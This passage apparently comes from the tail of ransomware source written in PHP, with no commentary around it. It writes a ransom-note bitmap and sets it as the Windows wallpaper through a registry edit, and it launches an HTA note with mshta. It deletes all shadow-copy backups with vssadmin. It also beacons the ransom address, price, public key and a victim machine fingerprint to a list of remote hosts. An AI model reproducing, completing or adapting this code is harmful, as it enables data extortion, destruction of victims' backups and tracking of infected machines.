3L6UhfbYU3hw0HJ+XpoeN55MboLqDw7c4g13uS8CXMS27GRnfqkOOchDVkwMb/6rTfkeM+57k51sR3W5K76PcrOJzXis87T6b6Oy1fy7MwhVthyrrbEHefasElbx1K/0LhAnPNlwFIwN9lL7vxz3/mg+jvifPDOXTcV52N/wrmn24zuCswUP1/GKQ+6wuXO0zmKscJub7XzpYktBOMiEUOFHg86L1wr7WRJNazJH66GsvNwgTkZfKaRA6f5qEd3Bc1UenbmoCd8tfPCjh/aVZzrB3L2SaMQ8nPOR9nfKedu8LHifLjCuYruCuxUenbmoCd8tfN0inKsivNlabR5MP6y0hiHCl1O0zHn+bdqMqot5/MAJnMe+h+vcH75ji4+coyxYNATvth56a6G0K7yfr6uKji3ouOz7+fzNLMozryfz/8af5Y88msydmPw0I8aIXVejO4K6s/OFOFc7Fwsd6rTPLmudvpATkHru4pDjXJu447z7FlsZ87b53iW9/LcuX+0zGvO3/OkuCWO4rMzYzgXO7e6YaSVefALi3O7Vi8411Gc+3w++GDl4fPM5/O57dLgz5lz/47wmvMsukuY5zDG0/av+HzerpMb+pRGFvvZLs7dQu583Sv91nT6OlxhJvHZT7thzc4f67fsZefTa9fhCtFdwtxp+dmZ5XBEs+e/Py/3uXG93S3kzpfUdW2IRgrz3R1wLqI7c7197ax1L4f+Tc5ldFewdP/XOOZXOR/6HPlWevcbRnhnGEvOV0HxXNuIuPw4B5x3yUSq36tlYXXxvWro3+RcRncF9WdnlsNxvOy8Gkvxi2rXQ+bctYjZbEWOJjfOSeetVLP9/fkkPpelzqdf13n92ZnlcByvOG9lWzumsXT6pc+oeiCnCmMUm5GNfsLLbedNmlXrXS5T2bxPRn+zP8i83N3aF51n0V2CiRusHq4cjuMV541YvqlTZBPSGBMv3jhz58Z1FVJzj35Cq23nQZdHXsBvt++Hc9GY3PndbxEvOs+iu4TmeeeTbLrj3DOq98eb/lhkfR5DyvIjpwwmPLEpdhkqm2B/07mRk1+JNif54bIY1ihSOPRJXsofGo4+T6gS3RW4KNWzM4e4OvGXtPJRtnKae87jfe3tpJ1XbyRPH8gpe15qhSqN7iL0Ovbqpb66qa96NOmqjbCG5LXKS/lDw+lnQl7/gEC5wfZf4lxPcZTdtnLNJFuPftTPtHrnw4xXrnTn+85VDLqLzb9jca+dxSHNS/kE8hd4Dmjp2ZlDXG2m653vfKml18gdyibBxLTb0CDN3xHnYr4zrVhVe0qwOMyLN5Qj35+fdp5EdwVGdfwVztUcR9WvTLdqHUZNO17THj9P5X8Geu671F4fyx+bYY0y6iHPyxXO0+iuoBUz+SLn1W/Wan/o7WpZ3XEj2sdJxNDcXrjnPH+/FGtl93lYnczGkOSlMvhJ52953K9VPX+JczHvLu05XSGTa3XHsl4bO/ex+TntOB8LOQmrQ3jlsNTCoPLyWRv8nPNSdN8VK3OmCJc3n8d4BS92MYqCC8ICAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAv2Hu008+/+go/uYwP7P+8AvN7CB7ufAxL49uYXHlGV0vnVg35B32rWox45c70a2PxfitoU0CgZdRbsUG8LTz9rDz2EUXu3XD38IRAOeXo3ZLcah92vl01Hkj+ojdOucW5+/jJvYz6fVZ5/ejzm9pH8q5wfkbES7vwv+zzpujzlvZxxS6fcTRcP4uzBSO51boetb5dND5h1K+9hydW5y/k3Yqnrc96fxed97n29c8cHghnZvoHK7HRi0m6j/gfBBrg3N71LkJptcmvtt1/Ann70Tts1Hrk87NUedLtU6/DM7vOH8rpTfW/lnn/mTcr6s6v4Xd3O3oYy+ctzh/L9p550qfc26POr+L7sL1l+B8Es7vYly4CKOc+9LnnPu+/Lqqcyu3L7/P38V/lXN2+Ivx++YkDrdPOg/vE0O5l+i8kbWMq+WdNzh/M+okLmT3Kedh8xnKvUTnrVzhF7xzFQzO38DNS5JWn3PuD+37zo1c4Ws552EjxPnbmFZh8sr7iWsyy7uBc74sP+l8CM6Xo0WoKr9ghaswq8278vOM8/Vk/LDzYNJq58v2YH1Vi/M30KzptS87bxd3rzpfP7rh/K24rLYquc84X5b7V50vSyPO34o7qJtJXvx4wrm7znLYeeX9fF2F87fysaZcSn3K+dKke9a56/bxMYW9HefvY9F5k66ecj6tTQ45b+UKv7A4t+tAOH8vc85Hfdr+xOfzP7sah5w3spbf6RfnbkE5556Jy7F+/xL703nnZj20H3NuXeUFf7hYnLsFnL+XReFfJ3W967xzd2g/5lx+rxb+siG8ZYzCeRoIXMJN5NrznPPZ0iHn1e/PJ9cc52/G57qLRc857/qDzqv3yfhtAedvxisTRc85n18fc27Cjm5DS+987HH+dhrpPLlZyn3ujjz0Z7Vw36uXtDrPeun7wn2vn74veRvcssUE5y3O34KdYuJfcd7N7WvOW9Widn/7JPZ+nL+Ru0j8K86X9sec1/6Oxa/G+Zv5uMb5etg+6DzrQ/9BRHBucP4eTEz2C87Hpf1B52pHX6O4iwWcv5tWZP5552v7o87Lf3/u1+L83Vgnc+Zp5679YefF35nwS9r58CVZgC+A35MBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAQ/w/"));
    for ($i = 1000;$i < strlen($bmp);$i++) if (mt_rand(1, 100) < 10) $bmp[$i] = chr(mt_rand(1, 255));
    $fp = fopen($fn . ".bmp", "wb");
    fputs($fp, $bmp);
    fclose($fp);
    exec("reg add " . $cq . "HKCU" . $cs . "Control Panel" . $cs . "Desktop" . $cq . " /v Wallpaper /f /t REG_SZ /d " . $cq . $fn . ".bmp" . $cq);
    exec("RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters");
    exec("mshta.exe " . $cq . $fn . ".hta" . $cq);
    exec("vssadmin.exe Delete Shadows /All /Quiet");
}
foreach ($lands as $host) {
    file_get_contents("http://" . $host . "/counter/index.php?log=" . base64_encode(gzdeflate($address . ", " . $price . ", " . $keypub . ", " . md5($_ENV["COMPUTERNAME"] . ", " . $_ENV["USERNAME"] . ", " . $_ENV["OS"] . ", " . $_ENV["PROCESSOR_IDENTIFIER"]) . " " . $stat_drives . " " . $stat_files)));
}
